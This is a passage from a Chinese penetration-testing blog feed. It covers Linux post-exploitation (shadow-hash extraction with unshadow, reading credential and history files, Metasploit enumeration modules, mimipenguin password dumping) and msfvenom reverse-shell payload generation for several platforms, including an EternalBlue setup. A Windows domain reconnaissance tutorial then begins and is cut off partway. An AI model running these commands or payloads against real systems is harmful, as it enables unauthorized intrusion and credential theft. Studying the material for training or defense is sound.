<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mkdir <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="2"></td><td><pre>cd <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="3"></td><td><pre>unshadow passwd<span class="token punctuation">.</span>txt shadow<span class="token punctuation">.</span>txt <span class="token operator">></span> hash<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p>除了 <code>shadow</code>  意外也可以看一看其他敏感文件，比如数据库的配置、历史记录等</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>apache2<span class="token operator">/</span>config<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="2"></td><td><pre>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql<span class="token operator">/</span>user<span class="token punctuation">.</span><span class="token constant">MYD</span></pre></td></tr><tr><td data-num="3"></td><td><pre>cat <span class="token operator">/</span>root<span class="token operator">/</span>anaconda<span class="token operator">-</span>ks<span class="token punctuation">.</span>cfg</pre></td></tr><tr><td data-num="4"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bash_history</pre></td></tr><tr><td data-num="5"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>nano_history</pre></td></tr><tr><td data-num="6"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>atftp_history</pre></td></tr><tr><td data-num="7"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>mysql_history</pre></td></tr><tr><td data-num="8"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>php_history</pre></td></tr></table></figure><p>邮件也是一个关键点，某些场景下，可以发现非常敏感的信息。</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>mail<span class="token operator">/</span></pre></td></tr></table></figure><p>除了本机器上的信息还要为拿下内网的其他机器做准备，摸清网络拓扑是必须的。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>route</pre></td></tr><tr><td data-num="2"></td><td><pre>ip route        # 显示核心路由表</pre></td></tr><tr><td data-num="3"></td><td><pre>ip neigh        # 显示邻居表</pre></td></tr><tr><td data-num="4"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>resolv<span class="token punctuation">.</span>conf  # 查看<span class="token constant">DNS</span></pre></td></tr><tr><td data-num="5"></td><td><pre>arp <span class="token operator">-</span>e</pre></td></tr></table></figure><h3 id="00x03linux后渗透之信息收集metasploit"><a class="anchor" href="#00x03linux后渗透之信息收集metasploit">#</a> 00x03.Linux 后渗透之信息收集（metasploit）</h3>
<h4 id="msf启动"><a class="anchor" href="#msf启动">#</a> msf 启动</h4>
<p>输入命令 <code>msfconsole</code> ， <code>-q</code>  命令是不显示 <code>msflogo</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128175938642.png" alt="image-20211128175938642" /></p>
<h4 id="检查虚拟机"><a class="anchor" href="#检查虚拟机">#</a> 检查虚拟机</h4>
<p>所述<strong> checkvm</strong> 模块尝试来确定系统是否正在运行的虚拟环境的内部和如果是这样，哪一个。该模块支持  <code>Hyper-V、VMWare、VirtualBox、Xen 和 QEMU/KVM</code>  的检测。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128180049268.png" alt="image-20211128180049268" /></p>
<h4 id="枚举配置"><a class="anchor" href="#枚举配置">#</a> 枚举配置</h4>
<p>该<strong> enum_configs</strong> 上普遍安装的应用程序和服务，如 <code>Apache，MySQL</code>  和桑巴， <code>Sendmail</code>  的，等发现模块收集配置文件如果在默认路径中找到一个配置文件，该模块将认为是我们想要的文件。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128180210283.png" alt="image-20211128180210283" /></p>
<h4 id="枚举网络"><a class="anchor" href="#枚举网络">#</a> 枚举网络</h4>
<p>所述<strong> enum_network</strong> 从目标系统模块枚举网络信息的防火墙规则，接口，无线信息，打开和监听端口，活动的网络连接， <code>DNS</code>  信息和 <code>SSH</code>  信息。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128180311671.png" alt="image-20211128180311671" /></p>
<h4 id="枚举保护"><a class="anchor" href="#枚举保护">#</a> 枚举保护</h4>
<p>该<strong> enum_protections</strong> 模块试图找到某些安装的应用程序，可用于防止，或发现我们的攻击，这是通过查找特定的二进制位置完了，看看他们是否确实可执行文件。例如，如果我们能够将'snort' 作为命令运行，我们假设它是我们正在寻找的文件之一。该模块旨在涵盖各种防病毒、rootkit、IDS/IPS、防火墙和其他软件。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128180358620.png" alt="image-20211128180358620" /></p>
<h4 id="枚举系统"><a class="anchor" href="#枚举系统">#</a> 枚举系统</h4>
<p>该<strong> enum_system</strong> 模块收集系统信息。它收集已安装的包、已安装的服务、挂载信息、用户列表、用户 bash 历史记录和 cron 作业</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128180438152.png" alt="image-20211128180438152" /></p>
<h4 id="用户具体信息history"><a class="anchor" href="#用户具体信息history">#</a> 用户具体信息 HISTORY</h4>
<p>该<strong> enum_users_history</strong> 模块收集用户的具体信息。用户列表、bash 历史、mysql 历史、vim 历史、lastlog 和 sudoers。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128180521064.png" alt="image-20211128180521064" /></p>
<h3 id="00x04linux下抓取登陆用户密码神器mimipenguin"><a class="anchor" href="#00x04linux下抓取登陆用户密码神器mimipenguin">#</a> 00x04.Linux 下抓取登陆用户密码神器 mimipenguin</h3>
<p><code>mimipenguin</code>  就像是 <code>windows</code>  中的 <code>Mimikatz</code></p>
<p>下载命令：</p>
<pre><code class="language-ABAP">git clone https://github.com.cnpmjs.org/huntergregal/mimipenguin 
</code></pre>
<p><strong>root 权限</strong>下运行，通过转储过程和提取那些包含明文密码可能性很高的行 (hang)，充分利用内存中的明文凭证。通过检查 <code>/etc/shadow</code>  文件 <code>hash</code> , 内存中的 <code>hash</code>  和正则匹配去尝试计算出每个单词的概率</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128181246919.png" alt="image-20211128181246919" /></p>
<h3 id="00x05msf工具简单用法"><a class="anchor" href="#00x05msf工具简单用法">#</a> 00x05.msf 工具简单用法</h3>
<h4 id="msf使用方法"><a class="anchor" href="#msf使用方法">#</a> <strong>msf 使用方法</strong></h4>
<h5 id="1-使用方法"><a class="anchor" href="#1-使用方法">#</a> <strong>1 使用方法</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">进入msf</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>msfconsolesearch</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">命令查找模块</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>search ms17<span class="token operator">-</span>010use</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token literal-property property">进入模块</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span><span class="token function">ms17_010_eternalblue</span> <span class="token punctuation">(</span>search以后use <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">模块详细信息查看</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>use了以后info，没use 之前 info exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token literal-property property">设置攻击载荷</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token literal-property property">查看模块需要的参数</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>options</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token literal-property property">设置参数</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">set</span> lhost <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">(</span>参数名似乎不区分大小写<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token literal-property property">攻击</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>run <span class="token operator">/</span> exploit 都可以meterpreter后渗透阶段</pre></td></tr></table></figure><h5 id="2-rc脚本执行多个msf命令"><a class="anchor" href="#2-rc脚本执行多个msf命令">#</a> <strong>2 rc 脚本执行多个 msf 命令</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole <span class="token operator">-</span>r configure<span class="token punctuation">.</span>rc</pre></td></tr></table></figure><h4 id="msfvenom生成shellcode"><a class="anchor" href="#msfvenom生成shellcode">#</a> <strong>msfvenom 生成 shellcode</strong></h4>
<h5 id="1-一般生成"><a class="anchor" href="#1-一般生成">#</a> <strong>1 . 一般生成</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span>p 载荷 </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span>f 输出格式 </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span>o 输出文件msfvenom </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="6"></td><td><pre>大部分时候也是需要一些配置 lhost lport这些：</pre></td></tr><tr><td data-num="7"></td><td><pre>msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> lport<span class="token operator">=</span><span class="token number">8888</span><span class="token operator">-</span>i <span class="token number">3</span><span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr></table></figure><h5 id="2-编码生成"><a class="anchor" href="#2-编码生成">#</a> <strong>2. 编码生成</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom</pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token operator">-</span>a 系统架构</pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token operator">--</span>platform 系统平台</pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token operator">-</span>p 有效载荷</pre></td></tr><tr><td data-num="5"></td><td><pre>    lhost<span class="token operator">=</span>攻击机<span class="token constant">IP</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    lport<span class="token operator">=</span>攻击机端口</pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token operator">-</span>e 编码方式</pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token operator">-</span>i 编码次数</pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token operator">-</span>f 输出格式</pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token operator">-</span>o 输出文件</pre></td></tr><tr><td data-num="11"></td><td><pre>msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> lport<span class="token operator">=</span><span class="token number">8888</span><span class="token operator">-</span>i <span class="token number">3</span><span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="12"></td><td><pre>一般来说 <span class="token operator">-</span>a可以不用，<span class="token operator">--</span>platform也可以不用</pre></td></tr></table></figure><h5 id="3-查看支持的系统架构"><a class="anchor" href="#3-查看支持的系统架构">#</a> <strong>3. 查看支持的系统架构</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l archs</pre></td></tr></table></figure><h5 id="4-查看支持的系统平台"><a class="anchor" href="#4-查看支持的系统平台">#</a> <strong>4. 查看支持的系统平台</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l platforms</pre></td></tr></table></figure><h5 id="5-列出所有payload"><a class="anchor" href="#5-列出所有payload">#</a> <strong>5. 列出所有 payload</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l payload</pre></td></tr></table></figure><h5 id="6-列出所有的输出格式"><a class="anchor" href="#6-列出所有的输出格式">#</a> <strong>6. 列出所有的输出格式</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l formats</pre></td></tr></table></figure><h5 id="7-列出所有的加密方式"><a class="anchor" href="#7-列出所有的加密方式">#</a> <strong>7. 列出所有的加密方式</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l encrypt</pre></td></tr></table></figure><h5 id="8-列出所有的编码器"><a class="anchor" href="#8-列出所有的编码器">#</a> <strong>8. 列出所有的编码器</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l encoders</pre></td></tr></table></figure><h4 id="常见生成格式"><a class="anchor" href="#常见生成格式">#</a> <strong>常见生成格式</strong></h4>
<h5 id="1windows"><a class="anchor" href="#1windows">#</a> <strong>1.windows</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform windows <span class="token operator">-</span>a x86 <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>i <span class="token number">3</span><span class="token operator">-</span>ex86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr></table></figure><h5 id="2-linux"><a class="anchor" href="#2-linux">#</a> <strong>2. Linux</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform linux <span class="token operator">-</span>a x86 <span class="token operator">-</span>p linux<span class="token operator">/</span>x86<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>f elf <span class="token operator">-</span>opayload<span class="token punctuation">.</span>elf</pre></td></tr></table></figure><h5 id="3-mac"><a class="anchor" href="#3-mac">#</a> <strong>3. Mac</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform osx <span class="token operator">-</span>a x86 <span class="token operator">-</span>p osx<span class="token operator">/</span>x86<span class="token operator">/</span>shell_reverse_tcp <span class="token operator">-</span>f macho <span class="token operator">-</span>o payload<span class="token punctuation">.</span>macho</pre></td></tr></table></figure><h5 id="4-android"><a class="anchor" href="#4-android">#</a> <strong>4. Android</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p android<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>o payload<span class="token punctuation">.</span>apk</pre></td></tr></table></figure><h5 id="5-aspx"><a class="anchor" href="#5-aspx">#</a> <strong>5. Aspx</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>f aspx <span class="token operator">-</span>o payload<span class="token punctuation">.</span>aspx</pre></td></tr></table></figure><h5 id="6-jsp"><a class="anchor" href="#6-jsp">#</a> <strong>6. Jsp</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform java <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp <span class="token operator">-</span>f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>jsp</pre></td></tr></table></figure><h5 id="7-php"><a class="anchor" href="#7-php">#</a> <strong>7. PHP</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp <span class="token operator">-</span>f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>php</pre></td></tr></table></figure><h5 id="8-bash"><a class="anchor" href="#8-bash">#</a> <strong>8. Bash</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash <span class="token operator">-</span>f raw <span class="token operator">-</span>o shell<span class="token punctuation">.</span>sh</pre></td></tr></table></figure><p>参考资料：<br />
<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvMC1VcGZDdlVWelhaa1RBRUhIcmRoUQ==">红队视角下 Linux 信息收集</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVEROMDFLMC1jdEtwVnRfTGtqSmlhQQ=="> Linux 后渗透之信息收集（metasploit）</span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3N6bWUvcC8xMDA0NTUzMC5odG1s">Linux 下抓取登陆用户密码神器 mimipenguin</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvLWlpY0RfWkJndkEtbHNjbTc1WTdYdw==">Metasploit&amp;Cobalt Strike 基础</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9mODIzODZiOGE5YWM=">MSF-Metasploit（基础）</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（一）之（域工作组） 信息收集及工具使用</title>
    <url>/article/c99fbb57.html</url>
    <content><![CDATA[<p>唔，终于熬到信息搜集了 QAQ，可以说是内网渗透的非常重要的一部分吧，下面和小编一起简单了解一下吧。好东西当然要一起分享啦，所以......</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211217104741759.png" alt="image-20211217104741759" /></p>
<h3 id="00x01windows域工作组-信息收集"><a class="anchor" href="#00x01windows域工作组-信息收集">#</a> 00x01.Windows（域工作组） 信息收集</h3>
<p>主机信息搜集一般包含以下内容：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>操作系统、权限、内网<span class="token constant">IP</span>地址段、杀软、端口、服务、补丁情况、网络环境情况、共享、会话等如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软等。</pre></td></tr></table></figure><h4 id="一-windows工作组"><a class="anchor" href="#一-windows工作组">#</a> 一、Windows（工作组）</h4>
<h5 id="1-查看当前用户whoami-user"><a class="anchor" href="#1-查看当前用户whoami-user">#</a> 1、查看当前用户（whoami /user）</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133153098.png" alt="image-20211127133153098" /></p>
<h5 id="2-查看当前用户权限whoami-priv"><a class="anchor" href="#2-查看当前用户权限whoami-priv">#</a> 2、查看当前用户权限 (whoami /priv)</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133300792.png" alt="image-20211127133300792" /></p>
<h5 id="3-查看系统信息systeminfo"><a class="anchor" href="#3-查看系统信息systeminfo">#</a> 3、查看系统信息（systeminfo）</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133406078.png" alt="image-20211127133406078" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133431102.png" alt="image-20211127133431102" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133530540.png" alt="image-20211127133530540" /></p>
<h5 id="4-查看网络连接状态netstat-ano"><a class="anchor" href="#4-查看网络连接状态netstat-ano">#</a> 4、查看网络连接状态（netstat -ano）</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133615592.png" alt="image-20211127133615592" /></p>
<h5 id="5-机器名hostname"><a class="anchor" href="#5-机器名hostname">#</a> 5、机器名（hostname）</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133651973.png" alt="image-20211127133651973" /></p>
<h5 id="6-当前操作系统"><a class="anchor" href="#6-当前操作系统">#</a> 6、当前操作系统</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic <span class="token constant">OS</span> <span class="token keyword">get</span> Caption<span class="token punctuation">,</span>CSDVersion<span class="token punctuation">,</span>OSArchitecture<span class="token punctuation">,</span>Version</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127133726858.png" alt="image-20211127133726858" /></p>
<h5 id="7-查杀软"><a class="anchor" href="#7-查杀软">#</a> 7、查杀软</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">WMIC</span> <span class="token operator">/</span>Node<span class="token operator">:</span>localhost <span class="token operator">/</span>Namespace<span class="token operator">:</span>\\root\SecurityCenter2 Path AntiVirusProduct Get displayName <span class="token operator">/</span>Format<span class="token operator">:</span>list</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127134020531.png" alt="image-20211127134020531" /></p>
<p>这里由于小编把防护给关了，所以没有显示，下面附上大佬的显示图</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127134502222.png" alt="image-20211127134502222" /></p>
<h5 id="8-查看当前安装的程序"><a class="anchor" href="#8-查看当前安装的程序">#</a> 8、查看当前安装的程序</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic product <span class="token keyword">get</span> name<span class="token punctuation">,</span>version</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127134733601.png" alt="image-20211127134733601" /></p>
<h5 id="9-查看网络配置ipconfig-all"><a class="anchor" href="#9-查看网络配置ipconfig-all">#</a> 9、查看网络配置（ipconfig /all）</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127134809036.png" alt="image-20211127134809036" /></p>
<h5 id="10-查看进程tasklist-v"><a class="anchor" href="#10-查看进程tasklist-v">#</a> 10、查看进程（tasklist /v）</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>有些进程可能是域用户开启的<span class="token operator">-</span><span class="token operator">></span>通过管理员权限 凭证窃取<span class="token operator">-</span><span class="token operator">></span>窃取域用户的凭证</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127134845636.png" alt="image-20211127134845636" /></p>
<h5 id="11-查看当前登录域"><a class="anchor" href="#11-查看当前登录域">#</a> 11、查看当前登录域</h5>
<pre><code class="language-ABAP">net config workstation
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127134947750.png" alt="image-20211127134947750" /></p>
<h5 id="12-远程桌面连接历史记录"><a class="anchor" href="#12-远程桌面连接历史记录">#</a> 12、远程桌面连接历史记录</h5>
<pre><code class="language-ABAP">cmdkey /l
获取到凭证之后，本地解密
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127135026485.png" alt="image-20211127135026485" /></p>
<h5 id="13-查看本机上的用户账号列表"><a class="anchor" href="#13-查看本机上的用户账号列表">#</a> 13、查看本机上的用户账号列表</h5>
<pre><code class="language-ABAP">net user
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127135102033.png" alt="image-20211127135102033" /></p>
<h5 id="14-查看某个本机用户的具体信息"><a class="anchor" href="#14-查看某个本机用户的具体信息">#</a> 14、查看某个本机用户的具体信息</h5>
<pre><code class="language-ABAP">net user 用户名
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211127135145516.png" alt="image-20211127135145516" /></p>
<h5 id="15-获取域用户信息"><a class="anchor" href="#15-获取域用户信息">#</a> 15、获取域用户信息</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>net user <span class="token operator">/</span>domain #显示所在域的用户名单</pre></td></tr><tr><td data-num="2"></td><td><pre>net user 域用户<span class="token operator">/</span>domain #获取某个域用户的详细信息</pre></td></tr><tr><td data-num="3"></td><td><pre>net user <span class="token operator">/</span>domain xxx <span class="token number">1231312</span> #修改域用户的密码，需要域管理员权限</pre></td></tr></table></figure><h5 id="16-获取域用户列表"><a class="anchor" href="#16-获取域用户列表">#</a> 16、获取域用户列表</h5>
<p>在域服务器上输入以下命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>daquery user</pre></td></tr></table></figure><h2 id="00x02常见windows-信息收集工具"><a class="anchor" href="#00x02常见windows-信息收集工具">#</a> 00x02. 常见 windows 信息收集工具</h2>
<h4 id="一-对象"><a class="anchor" href="#一-对象">#</a> 一、对象</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>网站 ：源码  robots文件   后台登录</pre></td></tr><tr><td data-num="2"></td><td><pre>服务器 ：<span class="token constant">IP</span>地址  服务器操作系统类型和版本   端口开放情况</pre></td></tr><tr><td data-num="3"></td><td><pre>管理员 ：个人信息  手机号  社交账号  常用密码  敏感数字</pre></td></tr></table></figure><h4 id="二-网站操作类型识别方式"><a class="anchor" href="#二-网站操作类型识别方式">#</a> 二、网站操作类型识别方式</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>windows ：不区分大小写</pre></td></tr><tr><td data-num="2"></td><td><pre>Linux ：区分大小写</pre></td></tr></table></figure><h4 id="三-网站指纹识别工具"><a class="anchor" href="#三-网站指纹识别工具">#</a> 三、网站指纹识别工具</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>御剑指纹识别</pre></td></tr><tr><td data-num="2"></td><td><pre>云悉在线指纹识别</pre></td></tr><tr><td data-num="3"></td><td><pre>kali——whatweb</pre></td></tr><tr><td data-num="4"></td><td><pre>火狐浏览器插件——Wappalyzer</pre></td></tr></table></figure><h4 id="四-目录扫描敏感文件扫描"><a class="anchor" href="#四-目录扫描敏感文件扫描">#</a> 四、目录扫描 / 敏感文件扫描</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>搜索网站目录下面的敏感文件 间接识别网站使用的框架或者内容管理系统</pre></td></tr><tr><td data-num="2"></td><td><pre>工具  ：御剑指纹识别</pre></td></tr><tr><td data-num="3"></td><td><pre>	   谷歌黑客语法</pre></td></tr><tr><td data-num="4"></td><td><pre>		site：限制搜索范围的域名</pre></td></tr><tr><td data-num="5"></td><td><pre>		inurl：限制搜索的url中必须存在的内容</pre></td></tr><tr><td data-num="6"></td><td><pre>		intext：限制搜索的页面中必须存在的内容</pre></td></tr><tr><td data-num="7"></td><td><pre>		intitle：限制搜索的页面的标题栏中的内容</pre></td></tr><tr><td data-num="8"></td><td><pre>		filetype：限制搜索的文件类型</pre></td></tr></table></figure><h4 id="五-ip查询"><a class="anchor" href="#五-ip查询">#</a> 五、IP 查询</h4>
